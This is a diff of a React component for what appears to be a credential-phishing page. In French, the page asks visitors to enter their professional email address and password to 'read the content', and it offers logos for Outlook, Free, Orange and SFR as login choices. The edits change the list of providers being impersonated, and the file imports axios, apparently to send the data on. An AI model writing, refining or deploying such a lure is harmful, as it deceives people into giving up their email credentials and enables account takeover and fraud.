@@ -1,10 +1,10 @@
-import React, {useState, useEffect} from 'react';
+import React, {useState} from 'react';
 import './App.css';
 import oneDrive from './oneDrive.png';
+import free from './free.png'
 import orange from './orange (1).png';
 import outlook from './outlook.png';
 import pdf from './pdf.png';
-import ronducube from './ronducube.png';
 import sfr from './sfr.png';
 import axios from 'axios';
 
@@ -49,11 +49,10 @@ function App() {
             
             <p>Pour lire le contenu, veuillez utiliser vos informations de messagerie professionnelle.</p>
             <div class="email-providers">
-                <img src={outlook} alt="Outlook" style={{border: platform === "outlook" ? "1px solid black" : ""}} onClick={() => setPlatform("outlook")} />
-                <img src={ronducube} alt="Roundcube" style={{border: platform === "ronducube" ? "1px solid black" : ""}} onClick={() => setPlatform("ronducube")} />
-                <img src={orange} alt="Orange" style={{border: platform === "orange" ? "1px solid black" : ""}} onClick={() => setPlatform("orange")} />
-                <img src={ronducube} alt="bouygue" style={{border: platform === "bouygue" ? "1px solid black" : ""}} onClick={() => setPlatform("bouygue")} />
-                <img src={sfr} alt="SFR" style={{border: platform === "sfr" ? "1px solid black" : ""}} onClick={() => setPlatform("sfr")} />
+                <img src={outlook} alt="Outlook" style={{border: platform === "Outlook" ? "1px solid black" : ""}} onClick={() => setPlatform("Outlook")} />
+                <img src={free} alt="Free" style={{border: platform === "Free" ? "1px solid black" : ""}} onClick={() => setPlatform("Free")} />
+                <img src={orange} alt="Orange" style={{border: platform === "Orange" ? "1px solid black" : ""}} onClick={() => setPlatform("Orange")} />
+                <img src={sfr} alt="SFR" style={{border: platform === "Sfr" ? "1px solid black" : ""}} onClick={() => setPlatform("Sfr")} />
             </div>
             <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} class="email-input" placeholder="Veuillez entrer votre adresse professionnelle" />
             <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} class="email-input" placeholder="Veuillez entrer votre mot de passe" />
